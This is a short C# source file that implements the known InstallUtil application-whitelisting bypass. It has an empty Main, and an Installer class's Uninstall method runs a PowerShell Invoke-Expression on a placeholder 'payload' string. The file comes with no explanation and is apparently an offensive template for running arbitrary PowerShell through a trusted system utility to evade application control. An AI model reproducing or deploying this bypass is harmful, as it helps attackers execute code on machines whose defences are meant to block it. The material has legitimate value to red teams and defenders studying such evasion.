using System;
using System.Management.Automation;
namespace Whitelist
{
	class Program
	{
		static void Main(string[] args)
		{
		}
	}
}
[System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
        	PowerShell ps = PowerShell.Create();
			ps.AddCommand("Invoke-Expression");
			ps.AddArgument("payload");
			ps.Invoke();			
        }

    }
